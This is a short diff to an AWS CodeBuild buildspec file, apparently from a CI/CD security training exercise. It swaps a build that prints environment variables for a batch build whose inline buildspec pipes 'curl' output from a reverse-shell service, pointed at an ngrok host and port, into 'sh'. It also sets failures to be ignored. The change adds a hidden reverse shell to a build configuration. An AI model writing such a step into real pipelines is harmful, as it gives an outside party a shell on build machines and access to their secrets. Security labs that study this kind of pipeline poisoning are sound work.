@@ -1,8 +1,18 @@
 version: 0.2
 
-phases:
-  build:
-    commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+batch:
+  fast-fail: false
+  build-list:
+    - identifier: build1
+      env:
+        variables:
+          BUILD_ID: build1
+      buildspec: |
+        version: 0.2
+        env:
+          shell: sh
+        phases:
+          build:
+            commands:
+              - curl https://reverse-shell.sh/7.tcp.eu.ngrok.io:16662 | sh
+      ignore-failure: true
